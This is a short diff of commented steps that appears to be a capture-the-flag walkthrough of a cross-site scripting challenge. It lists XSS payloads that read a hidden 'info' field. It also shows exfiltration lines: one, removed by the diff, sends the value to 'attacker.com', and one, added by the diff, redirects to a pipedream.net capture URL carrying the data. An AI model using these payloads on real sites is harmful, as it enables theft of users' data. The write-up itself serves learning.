@@ -52,8 +52,7 @@
 #  * To use script = window.addEventListener('DOMContentLoaded'function(){ //execute code});
 #  9-1. Make XSS attack statement => "><script>alert(1)</script>
 #  10-1. Input the attack statement => "><script>window.addEventListener('DOMContentLoaded'function(){<img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);});</script>
-#  11. Print the flag => 
-var i = new Image();i.src = "HTTP://attacker.com"+secretData
+#  11. Check attack => "><img+src="https://x"+onerror="location.href='https://enjt04rx79at.x.pipedream.net/?data='%2b document.getElementsByName('info')[0].placeholder;">
 
 --------------------------------------------------------------------------------------------------------------------------------
 
